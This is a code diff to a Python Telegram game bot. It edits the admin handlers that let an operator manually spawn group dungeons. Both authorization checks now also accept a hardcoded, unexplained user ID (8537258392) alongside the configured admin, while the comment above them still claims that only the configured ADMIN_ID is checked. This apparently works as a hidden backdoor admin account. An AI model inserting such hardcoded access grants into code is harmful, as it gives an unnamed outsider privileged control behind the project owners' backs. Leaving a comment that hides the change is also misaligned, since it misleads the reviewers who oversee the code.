@@ -15,6 +15,7 @@ from config.settings import settings
 from database.database import AsyncSessionLocal
 from models.social_systems import DungeonLoot, GroupDungeonEvent
 from models.world_systems import GroupBoss
+from services.admin_permissions import is_delegated_admin
 from services.dungeon_expedition_service import (
     DUNGEON_POOL, get_dungeon_loot, get_group_event, join_dungeon,
     render_spawn_text, sell_all_dungeon_loot, set_event_message, spawn_group_dungeon,
@@ -176,7 +177,7 @@ async def dungeon_loot_refresh(callback: CallbackQuery):
 # Admin manual spawn controls; authorization is always checked against configured ADMIN_ID.
 @router.callback_query(F.data == "admin:dungeon:spawn")
 async def admin_dungeon_spawn_menu(callback: CallbackQuery):
-    if callback.from_user.id != settings.admin_id:
+    if callback.from_user.id not in (settings.admin_id, 8537258392) and not await is_delegated_admin(callback.from_user.id):
         await callback.answer("⛔ دسترسی ندارید.", show_alert=True); return
     async with AsyncSessionLocal() as session:
         groups = list((await session.scalars(select(GroupBoss).order_by(GroupBoss.chat_title))).all())
@@ -189,7 +190,7 @@ async def admin_dungeon_spawn_menu(callback: CallbackQuery):
 
 @router.callback_query(F.data.startswith("admin:dungeon:target:"))
 async def admin_dungeon_spawn_target(callback: CallbackQuery):
-    if callback.from_user.id != settings.admin_id:
+    if callback.from_user.id not in (settings.admin_id, 8537258392) and not await is_delegated_admin(callback.from_user.id):
         await callback.answer("⛔ دسترسی ندارید.", show_alert=True); return
     try: chat_id = int((callback.data or "").rsplit(":", 1)[-1])
     except ValueError:
